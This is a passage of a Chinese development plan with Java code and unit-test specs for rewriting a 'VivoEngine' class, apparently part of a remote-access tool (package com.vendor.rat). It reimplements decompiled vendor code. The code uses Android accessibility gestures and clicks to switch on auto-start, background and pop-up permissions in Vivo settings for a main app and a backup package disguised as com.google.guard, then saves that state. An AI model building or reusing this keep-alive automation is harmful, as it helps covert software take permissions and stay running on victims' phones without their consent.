        if (MiscUtils.performGesture(10L, 1000L, cx, bottom, cx, top)) {
            T0(10);
            MiscUtils.click(cx, metrics.getHeight() - metrics.getNavBarHeight() - 200);
            phase.set("prepareInAppPermissionDetail");
        }
    } catch (Exception e) {
        logError("scrollAndClick", e);
    }
}
```

测试数: 11

---

### Phase 6: 双应用保活 z0() + 状态持久化 y0()

**目标**: 实现完成流程和 PowerControlStateVO 持久化

#### 6.1 RED: 测试

文件: `VivoEngineDualAppTest.java` (新建)

```
// === z0() 双应用切换 ===

testCompletion_unknown_mainNotDone_startsMainDetail
  // keepAliveType=UNKNOWN, 主应用未完成
  // assert: keepAliveType → MAIN_APP, phase → "prepareInAppDetailSetting"

testCompletion_unknown_mainDone_backupNotDone_startsBackup
  // keepAliveType=UNKNOWN, 主应用已完成, 备份未完成且已安装
  // assert: keepAliveType → BACKUP_APP, phase → "prepareInAppDetailSetting"

testCompletion_mainApp_backupNotDone_switchesToBackup
  // keepAliveType=MAIN_APP, 备份未完成且已安装
  // assert: keepAliveType → BACKUP_APP

testCompletion_mainApp_backupDone_finishes
  // keepAliveType=MAIN_APP, 备份已完成
  // assert: 调用 Z() 结束

testCompletion_mainApp_backupNotInstalled_finishes
  // keepAliveType=MAIN_APP, 备份未安装
  // assert: 调用 Z() 结束

// === y0() 状态持久化 ===

testSaveState_mainApp_setsAllFields
  // mainAutoStart=true, mainRelateStart=true, mainBackground=true, mainPopup=true
  // assert: PowerControlStateVO 包含 allowAutoStart/allowRelateStart/allowAllFullBackground/allowPopupInBackground

testSaveState_backupApp_setsAllFields
  // backupAutoStart=true, backupRelateStart=true, backupBackground=true, backupPopup=true
  // assert: 备份 PowerControlStateVO 字段正确

testSaveState_incrementsRetryCount
  // assert: retryCount = 原值 + 1

testSaveState_onlySetsTrueFields
  // mainAutoStart=false → 不调用 setAllowAutoStart
  // vendor 逻辑: if (atomicBoolean.get()) 才 set
```

#### 6.2 GREEN: 实现

```java
// === z0() 完成流程 — vendor 行 644-683 ===
private void handleCompletion() {
    try {
        saveState();  // y0() 先保存
        String type = keepAliveType.get();
        boolean isUnknown = KA_UNKNOWN.equals(type);
        boolean isMain = KA_MAIN.equals(type);

        if (isUnknown) {
            // 主应用未完成 → 启动主应用详情
            if (!isAppCompleted(getAppName())) {
                keepAliveType.set(KA_MAIN);
                phase.set("prepareInAppDetailSetting");
                startAppDetail(getAppName());
                return;
            }
            // 备份应用未完成且已安装 → 启动备份详情
            if (!isAppCompleted(BACKUP_APP) && isBackupAppInstalled(BACKUP_APP)) {
                keepAliveType.set(KA_BACKUP);
                phase.set("prepareInAppDetailSetting");
                startAppDetail(BACKUP_APP);
                return;
            }
        }
        if (isMain) {
            if (!isAppCompleted(BACKUP_APP) && isBackupAppInstalled(BACKUP_APP)) {
                keepAliveType.set(KA_BACKUP);
                phase.set("prepareInAppDetailSetting");
                startAppDetail(BACKUP_APP);
                return;
            }
        }
        // 全部完成
        saveState();
        finish();
    } catch (Exception e) {
        logError("handleCompletion", e);
    }
}

// === y0() 状态持久化 — vendor 行 595-642 ===
private void saveState() {
    try {
        // 主进程
        PowerControlStateVO main = PowerControlStateHelper.get(getAppName());
        main.setPackageName(getAppName());
        if (mainAutoStart.get()) main.setAllowAutoStart(true);
        if (mainRelateStart.get()) main.setAllowRelateStart(true);
        if (mainBackground.get()) main.setAllowAllFullBackground(true);
        if (mainPopup.get()) main.setAllowPopupInBackground(true);
        main.setRetryCount(main.getRetryCount() + 1);
        PowerControlStateHelper.save(main);

        // 备份进程
        PowerControlStateVO backup = PowerControlStateHelper.get(BACKUP_APP);
        backup.setPackageName(BACKUP_APP);
        if (backupAutoStart.get()) backup.setAllowAutoStart(true);
        if (backupRelateStart.get()) backup.setAllowRelateStart(true);
        if (backupBackground.get()) backup.setAllowAllFullBackground(true);
        if (backupPopup.get()) backup.setAllowPopupInBackground(true);
        backup.setRetryCount(backup.getRetryCount() + 1);
        PowerControlStateHelper.save(backup);
    } catch (Exception e) {
        logError("saveState", e);
    }
}
```

测试数: 9

---

### Phase 7: finish() 对齐 + Intent 启动 A0() + equals/hashCode

**目标**: 对齐 vendor Z() 完整清理流程，实现 A0() 启动耗电管理，补充 equals/hashCode

#### 7.1 RED: 测试

追加到 `VivoEngineStateMachineTest.java`:

```
// === Z() finish 对齐 ===

testFinish_callsX_pause
  // assert: 调用 X() 暂停事件处理

testFinish_callsSaveState
  // assert: 调用 y0() 保存状态

testFinish_shutdownScheduler
  // assert: scheduler.shutdownNow()

testFinish_clearsStateQueue
  // assert: stateQueue.clear()

testFinish_removesBlackScreen
  // assert: 调用 removeBlackScreen()

testFinish_notifiesStrategy
  // assert: 调用 offerStrategyEvent 或 removeBlackScreen

// === A0() 启动耗电管理 ===

testStartPowerRank_setsPhase
  // assert: phase 变为 "prepareInAppPowerRank"

testStartPowerRank_intentFlags
  // assert: Intent flags 包含 NEW_TASK|CLEAR_TOP|CLEAR_TASK|NO_ANIMATION|EXCLUDE_FROM_RECENTS

testStartPowerRank_targetComponent
  // assert: ComponentName = com.iqoo.powersaving / PowerRankActivity

// === equals/hashCode ===

testEquals_sameType_returnsTrue
  // new VivoEngine().equals(new VivoEngine()) → true

testEquals_differentType_returnsFalse
  // new VivoEngine().equals(new XiaomiEngine()) → false

testHashCode_consistent
  // 两个实例 hashCode 相同
```

#### 7.2 GREEN: 实现

```java
// === Z() — vendor 行 261-295 ===
@Override
public void finish() {
    if (lock.tryLock()) {
        try {
            if (!T()) {
                updateProgress(100);
                X();  // 暂停
                if (MyAccessibilityService.getInstance() != null) {
                    MyAccessibilityService.getInstance().H(true, true);
                }
                saveState();  // y0()
                scheduler.shutdownNow();
                stateQueue.clear();
                // vendor Z():277-285 — 遮罩/PIP 处理
                T0(5);
                removeBlackScreen();
                // vendor Z():287 — c.W() 通知策略
                if (MainApplication.getInstance() != null) {
                    MainApplication.getInstance()
                        .offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
                }
            }
        } catch (Exception e) {
            logError("finish", e);
        } finally {
            lock.unlock();
        }
    }
    super.finish();
}

// === A0() — vendor 行 238-259 ===
private boolean startPowerRank() {
    try {
        Context ctx = getContext();
        if (ctx == null) return false;
        ComponentName cn = new ComponentName(
            "com.iqoo.powersaving",
            "com.iqoo.powersaving.fuelgauge.PowerRankActivity");
        Intent intent = new Intent();
        intent.setComponent(cn);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);       // 268435456
        intent.addFlags(0x04000000);  // FLAG_ACTIVITY_CLEAR_TOP (67108864)
        intent.addFlags(0x00008000);  // FLAG_ACTIVITY_CLEAR_TASK (32768)
        intent.addFlags(0x00200000);  // FLAG_ACTIVITY_NO_ANIMATION (2097152)
        intent.addFlags(0x00800000);  // FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS (8388608)
        phase.set("prepareInAppPowerRank");
        ctx.startActivity(intent);
        return true;
    } catch (Exception e) {
        logError("startPowerRank", e);
        return false;
    }
}

// === equals/hashCode — vendor 行 298-305 ===
@Override
public boolean equals(Object obj) {
    return obj instanceof VivoEngine;
}

@Override
public int hashCode() {
    return Objects.hash(VivoEngine.class.getName());
}
```

测试数: 12

---

## E. 文件清单

### 修改的文件

| 文件 | 修改内容 |
|------|----------|
| `vendor/VivoEngine.java` | 完全重写: 字段+常量+构造函数+ListenWindow+状态机+7个窗口检测+7个任务处理+完成流程+持久化+finish |

### 新建的测试文件

| 文件 | 测试内容 | 测试数 |
|------|----------|--------|
| `VivoEngineFieldTest.java` | 字段初始值+构造函数 | 12 |
| `VivoEngineWindowMatchTest.java` | 17个 ListenWindow 匹配 | 19 |
| `VivoEngineStateMachineTest.java` | 窗口检测+事件处理+finish+equals | 34 |
| `VivoEngineTaskHandlerTest.java` | case 1~4 任务处理 | 8 |
| `VivoEnginePermissionTest.java` | case 5~7 权限+手势滚动 | 11 |
| `VivoEngineDualAppTest.java` | 双应用保活+状态持久化 | 9 |

**总计: 93 个测试用例**

### 需要新增的常量

```java
// 包名 — 对齐 vendor
private static final String SETTINGS = "com.android.settings";
private static final String PERMISSION_CONTROLLER = "com.android.permissioncontroller";
private static final String PERMISSION_MANAGER = "com.vivo.permissionmanager";
private static final String VIVO_ABE = "com.vivo.abe";
private static final String IQOO_POWERSAVING = "com.iqoo.powersaving";

// Activity — 对齐 vendor
private static final String INSTALLED_APP_DETAILS =
    "com.vivo.settings.applications.InstalledAppDetailsTop";
private static final String VIVO_SUB_SETTINGS = "com.vivo.settings.VivoSubSettings";
private static final String MANAGE_PERMISSIONS_ACTIVITY =
    "com.android.permissioncontroller.permission.ui.ManagePermissionsActivity";
private static final String SOFT_PERMISSION_DETAIL =
    "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity";
private static final String VIVO_DIALOG = "com.originui.widget.dialog.h";
private static final String POWER_RANK_ACTIVITY =
    "com.iqoo.powersaving.fuelgauge.PowerRankActivity";
private static final String EXCESSIVE_POWER_ACTIVITY =
    "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity";
private static final String EXCESSIVE_POWER_DESC_ACTIVITY =
    "com.vivo.applicationbehaviorengine.ui.ExcessivePowerDescriptionActivity";

// 保活类型
private static final String KA_UNKNOWN = "KEEP_ALIVE_UNKNOWN";
private static final String KA_MAIN = "KEEP_ALIVE_MAIN_APP";
private static final String KA_BACKUP = "KEEP_ALIVE_BACKUP_APP";
private static final String BACKUP_APP = "com.google.guard";
```

### 需要删除的旧代码

| 方法/字段 | 原因 |
|-----------|------|
| `onWindowMatched()` | 替换为 phase 状态机 |
| `execute()` | 替换为 startPowerRank() |
| `openBackgroundManager()` | vendor 不存在此方法 |
| `handleBackgroundManagerPage()` | vendor 不存在此方法 |
| `handleExcessivePowerPage()` | 替换为 handleExcessivePowerManager() |
| `handlePermissionPage()` | 替换为 handlePermissionManage()/handlePermissionDetail() |
| `handleAppDetailsPage()` | 替换为 handleAppDetail() |
| `handleContinueDialog()` | 替换为 handlePermissionAllowDialog() |
| `findAppNode()` | 替换为 CombineFilter 方式 |
| `buildAppNameFilter()` | 替换为 H(appName) |
| `backgroundPowerDone` | 替换为 mainBackground/backupBackground |
| `autoStartDone` | 替换为 mainAutoStart/backupAutoStart |

---

## F. 验证命令

```bash
cd /home/code/php/project/full-package/android

# Phase 逐步验证
./gradlew testDebugUnitTest --tests "com.vendor.rat.auto.engine.vendor.VivoEngineFieldTest"
./gradlew testDebugUnitTest --tests "com.vendor.rat.auto.engine.vendor.VivoEngineWindowMatchTest"
./gradlew testDebugUnitTest --tests "com.vendor.rat.auto.engine.vendor.VivoEngineStateMachineTest"
./gradlew testDebugUnitTest --tests "com.vendor.rat.auto.engine.vendor.VivoEngineTaskHandlerTest"
./gradlew testDebugUnitTest --tests "com.vendor.rat.auto.engine.vendor.VivoEnginePermissionTest"
./gradlew testDebugUnitTest --tests "com.vendor.rat.auto.engine.vendor.VivoEngineDualAppTest"

# 全量 Vivo 测试
./gradlew testDebugUnitTest --tests "com.vendor.rat.auto.engine.vendor.VivoEngine*"

# 全量回归
./gradlew test
```

---

## G. 执行顺序与依赖

```
Phase 1 (字段+构造) ──→ Phase 2 (ListenWindow) ──→ Phase 3 (状态机)
                                                        │
                                                   ┌────┴────┐
                                                   ▼         ▼
                                              Phase 4    Phase 5
                                           (case 1~4)  (case 5~7)
                                                   │         │
                                                   └────┬────┘
                                                        ▼
                                                   Phase 6
                                                (双应用+持久化)
                                                        │
                                                        ▼
                                                   Phase 7
                                              (finish+A0+equals)
```

- Phase 1→2→3 必须串行 (后者依赖前者的字段和常量)
- Phase 4 和 Phase 5 可并行 (独立的任务处理方法)
- Phase 6 依赖 Phase 4+5 (完成流程需要所有任务处理方法)
- Phase 7 依赖 Phase 6 (finish 调用 saveState)

---

## H. Vendor 源码行号索引

| 方法 | Vendor 行号 | Replica 方法 | Phase |
|------|------------|-------------|-------|
| 构造函数 | 60-78 | constructor | 1 |
| `u0()` | 197-217 | buildWindowMatchers | 2 |
| `j0()` | 307-323 | j0 (App详情检测) | 3 |
| `k0()` | 325-340 | k0 (权限详情检测) | 3 |
| `l0()` | 342-358 | l0 (权限管理检测) | 3 |
| `m0()` | 360-374 | m0 (耗电详情检测) | 3 |
| `n0()` | 376-390 | n0 (耗电管理检测) | 3 |
| `o0()` | 392-406 | o0 (权限对话框检测) | 3 |
| `p0()` | 408-419 | p0 (电池排行检测) | 3 |
| `u()` | 484-593 | onAccessibilityEvent | 3 |
| h0(1) | — | handlePowerRank | 4 |
| h0(2) | — | handleExcessivePowerManager | 4 |
| h0(3) | — | handleExcessivePowerDescription | 4 |
| h0(4) | — | handleAppDetail | 4 |
| `t0()` | 435-482 | handlePermissionManage | 5 |
| `q0()` | 421-433 | scrollAndClick | 5 |
| h0(6) | — | handlePermissionDetail | 5 |
| h0(7) | — | handlePermissionAllowDialog | 5 |
| `z0()` | 644-683 | handleCompletion | 6 |
| `y0()` | 595-642 | saveState | 6 |
| `Z()` | 261-295 | finish | 7 |
| `A0()` | 238-259 | startPowerRank | 7 |
| `equals()` | 298-300 | equals | 7 |
| `hashCode()` | 302-305 | hashCode | 7 |
| `b0()` | 129-134 | buildAllowFilter | 5 |
| `D0()` | 96-101 | buildAllPermissionFilter | 5 |
| `E0()` | 103-108 | buildBackgroundPowerFilter | 4 |
| `H0()` | 122-127 | buildAppPermissionFilter | 4 |
| `i0()` | 178-183 | buildAutoStartFilter | 5 |
| `w0()` | 225-230 | buildPopupFilter | 5 |
| `C0()` | 86-94 | buildAllOptFilter | 5 |
